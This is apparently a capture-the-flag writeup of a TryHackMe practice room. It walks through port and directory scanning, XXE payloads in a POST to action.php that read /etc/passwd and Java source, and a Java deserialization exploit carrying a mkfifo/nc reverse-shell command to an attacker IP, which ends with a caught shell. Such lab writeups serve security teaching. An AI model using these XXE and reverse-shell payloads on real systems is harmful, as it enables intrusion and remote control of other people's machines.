# You're in a cave — Writeup

## Overview
### You're in a cave — Writeup
### You're in a cave — Writeup
----
A room with some ctf elements inspired in text based RPGs
----
![](https://i.postimg.cc/dVKytjXS/Inacave-Banner.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/745fb3128b486d61f737505f8ab339dc.png)
Start Machine
Hello, i made this room to be a fun challenge very CTF-like, the room acts like you are a RPG adventurer and is passing through some challenges, hope you like it :D
Icon made by [Freepik](http://www.freepik.com/) from [www.flaticon.com](https://www.flaticon.com/)
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.216.57 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.216.57:80
Open 10.10.216.57:2222
Open 10.10.216.57:3333
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.216.57 [3 ports]
Discovered open port 80/tcp on 10.10.216.57
Discovered open port 2222/tcp on 10.10.216.57
Discovered open port 3333/tcp on 10.10.216.57
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.216.57
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.216.57.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.216.57
Host is up, received user-set (0.18s latency).

PORT     STATE SERVICE    REASON  VERSION
80/tcp   open  http       syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Document
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7916b1cee11679b4f1c71f0905b77558 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSaK6ObZFXig5BkU5l9Q93xGbK2DZHPk4lVbU3Bb0nTzNYK13RTmVxgsI99ib9UFNCNFE+z0/Whm1IEfd4zc163VpTBy8XWL+V/9SHALariFmB5oxY/9tYe2y22LLQQjvF5leuNglhawyDa9b/8v85EknYmtgSaw9adqdUFOkX/X9Od5xienC1SFclB+J3BShCTLdObEkhCPOj01EX31BdCfvbdBDpCtBLZy+eMUcnL9BKNHztDjoB6DDCiFvVwchi+B4a9UoXR+jqGyfKmawzVjySgC3EMJ8bhMvhq1Y1odXJ3UOc1UvEt0UbgGOUbsDXP2FeYKzhebLcMw3WPw7/0UH+P6bO3lpCDlT/8cFX3LQ/YPR+jWNXTaxJpSGgtdMQZtjZuxdhtqF4k7dcgnMqg6hlmoMm6L4ttK/BkW8WQPndulkhfijKxAbUjwBKJfzX84ECSakSk92slUH/ANyyceZG2x5GRF+/EMRasYF1+8nQ7UCw66LtkpYmhJGQOO8=
|   256 35606e3ba8ac4a6a76423d5913049019 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5qUgJqhJDqY31rnfF1SEX79P2lCkxWrwIlMwyPbEBimlf8SryTdh0SeJbE1S+yopedohItJgZvnf7inSrqkk4=
|   256 79a605ca8432dc59b49b8b30953400c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE4DPjU+eVlEZSI6qHQ8/JdPLYigyluwDMOC1+bLo5Op
3333/tcp open  dec-notes? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, NULL, RPCCheck, SMBProgNeg, X11Probe, kumo-server: 
|     You find yourself in a cave, what do you do?
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     You find yourself in a cave, what do you do?
|_    Nothing happens
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3333-TCP:V=7.93%I=7%D=6/30%Time=649F7A39%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you
SF:\x20do\?\n")%r(GenericLines,3D,"You\x20find\x20yourself\x20in\x20a\x20c
SF:ave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(LPDString,3
SF:D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20
SF:do\?\nNothing\x20happens\n")%r(JavaRMI,2D,"You\x20find\x20yourself\x20i
SF:n\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(kumo-server,2D,"You\
SF:x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n"
SF:)%r(GetRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\
SF:x20do\x20you\x20do\?\nNothing\x20happens\n")%r(HTTPOptions,3D,"You\x20f
SF:ind\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothi
SF:ng\x20happens\n")%r(RTSPRequest,3D,"You\x20find\x20yourself\x20in\x20a\
SF:x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(RPCChec
SF:k,2D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\
SF:x20do\?\n")%r(DNSVersionBindReqTCP,2D,"You\x20find\x20yourself\x20in\x2
SF:0a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(DNSStatusRequestTCP,2D,"
SF:You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\
SF:?\n")%r(Help,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x2
SF:0do\x20you\x20do\?\nNothing\x20happens\n")%r(SSLSessionReq,3D,"You\x20f
SF:ind\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothi
SF:ng\x20happens\n")%r(TerminalServerCookie,3D,"You\x20find\x20yourself\x2
SF:0in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing\x20happens\n")%
SF:r(TLSSessionReq,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what
SF:\x20do\x20you\x20do\?\nNothing\x20happens\n")%r(Kerberos,3D,"You\x20fin
SF:d\x20yourself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\nNothing
SF:\x20happens\n")%r(SMBProgNeg,2D,"You\x20find\x20yourself\x20in\x20a\x20
SF:cave,\x20what\x20do\x20you\x20do\?\n")%r(X11Probe,2D,"You\x20find\x20yo
SF:urself\x20in\x20a\x20cave,\x20what\x20do\x20you\x20do\?\n")%r(FourOhFou
SF:rRequest,3D,"You\x20find\x20yourself\x20in\x20a\x20cave,\x20what\x20do\
SF:x20you\x20do\?\nNothing\x20happens\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.44 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.216.57/ -w /usr/share/wordlists/dirb/common.txt -x txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.57/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.216.57/.hta                 (Status: 403) [Size: 277]
http://10.10.216.57/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.216.57/.htpasswd            (Status: 403) [Size: 277]
http://10.10.216.57/.htaccess            (Status: 403) [Size: 277]
http://10.10.216.57/.hta.txt             (Status: 403) [Size: 277]
http://10.10.216.57/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.216.57/index.php            (Status: 200) [Size: 337]
http://10.10.216.57/matches              (Status: 200) [Size: 249]
http://10.10.216.57/search               (Status: 200) [Size: 197]
http://10.10.216.57/server-status        (Status: 403) [Size: 277]
Progress: 9139 / 9230 (99.01%)
===============================================================
 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.216.57/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.216.57/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.216.57/search               (Status: 200) [Size: 197]
http://10.10.216.57/attack               (Status: 200) [Size: 181]
http://10.10.216.57/lamp                 (Status: 200) [Size: 261]
http://10.10.216.57/matches              (Status: 200) [Size: 249]
http://10.10.216.57/walk                 (Status: 200) [Size: 161]

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333     
You find yourself in a cave, what do you do?
search
You can't see anything, the cave is very dark.

                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
attack
You punch the wall, nothing happens.

                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
lamp
You grab a lamp, and it gives enough light to search around
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh

                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
search
You can't see anything, the cave is very dark.

                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
matches
You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.216.57 3333
You find yourself in a cave, what do you do?
walk
There's nowhere to go.

http://10.10.216.57/action.php

using burp

POST /action.php HTTP/1.1

Host: 10.10.216.57

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 100

Origin: http://10.10.216.57

Connection: close

Referer: http://10.10.216.57/

Upgrade-Insecure-Requests: 1

Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

Response

HTTP/1.1 200 OK

Date: Sat, 01 Jul 2023 01:06:47 GMT

Server: Apache/2.4.41 (Ubuntu)

Vary: Accept-Encoding

Content-Length: 1413

Connection: close

Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
cave:x:1000:1000:,,,:/home/cave:/bin/bash
door:x:1001:1001:,,,:/home/door:/bin/bash
skeleton:x:1002:1002:,,,:/home/skeleton:/bin/bash

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/RPG.java'>]><root>&test;</root>

import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import org.apache.commons.io.IOUtils;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {
        try ( ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                connectionSocket = serverSocket.accept();

                is = connectionSocket.getInputStream();
                os = connectionSocket.getOutputStream();

                scanner = new Scanner(is, "UTF-8");
                serverPrintOut = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
                try {
                    serverPrintOut.println("You find yourself in a cave, what do you do?");
                    String s = scanner.nextLine();
                    URL url = new URL("http://cave.thm/" + s);
                    URLConnection con = url.openConnection();
                    InputStream in = con.getInputStream();
                    String encoding = con.getContentEncoding();
                    encoding = encoding == null ? "UTF-8" : encoding;
                    String string = IOUtils.toString(in, encoding);
                    string = string.replace("\n", "").replace("\r", "").replace(" ", "");
                    Action action = (Action) Serialize.fromString(string);
                    action.action();
                    serverPrintOut.println(action.output);
                } catch (Exception ex) {
                    serverPrintOut.println("Nothing happens");
                }
                connectionSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:////home/cave/src/run.sh'>]><root>&test;</root>

#!/bin/bash
javac -cp ".:commons-io-2.7.jar" RPG.java
java -cp ".:commons-io-2.7.jar" RPG

using java compiler

https://www.jdoodle.com/online-java-compiler/ or using replit

https://replit.com/@WittyAle/in-a-cave-tryhackme#RPG.java

 javac RPG.java
 java RPG

import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {                                                                                                  
        try{                                                                                                                                  
            String str = Serialize.toString( new Action("abc","trying\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1234 >/tmp/f;echo \"") );                                                                                                                        
            System.out.println( "abc : " + str );                                                                                                                                                                        
        }catch(Exception e){                                                                                                                  
            System.out.println("aa");                                                                                                         
        }                                                                                                                                     
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}

┌──(witty㉿kali)-[~/Downloads/CCT2019/results]
└─$ nc 10.10.202.200 3333
You find yourself in a cave, what do you do?
action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB%2BAAFMAAZvdXRwdXRxAH4AAXhwdABddHJ5aW5nIjtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC44LjE5LjEwMyAxMjM0ID4vdG1wL2Y7ZWNobyAidAADYWJjdAAA</xml>

──(witty㉿kali)-[~/Downloads]
└─$ nc -lvp 1234
listening on [any] 1234 ...
connect to [10.8.19.103] from cave.thm [10.10.202.200] 42596
/bin/sh: 0: can't access tty; job control turned off
```
```text
$ ls
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh
```
```text
$ cd /home
```
```text
$ ls
